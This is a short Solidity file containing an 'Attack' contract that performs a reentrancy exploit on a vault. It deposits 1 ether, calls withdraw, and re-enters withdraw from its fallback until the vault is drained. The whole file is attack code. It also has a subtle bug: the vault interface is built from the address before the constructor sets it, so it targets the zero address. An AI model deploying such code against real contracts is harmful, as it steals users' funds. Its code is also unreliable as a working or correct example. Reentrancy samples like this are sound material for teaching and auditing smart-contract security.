// SPDX-License-Identifier: MIT
pragma solidity ^0.8.6;
 
interface IVault{
   function deposit() external payable;
   function withdraw() external;
}
 
contract Attack {
   address vaultAddress;
   constructor(address _vaultAddress){
      vaultAddress =  _vaultAddress;
   }
   IVault vault = IVault(vaultAddress);
   function attack() external payable {
       require(msg.value >= 1 ether);
       vault.deposit{value: 1 ether}();
       vault.withdraw();
   }
    fallback() external payable {
       if (address(vault).balance >= 1 ether) {
           vault.withdraw();
       }
   }
}
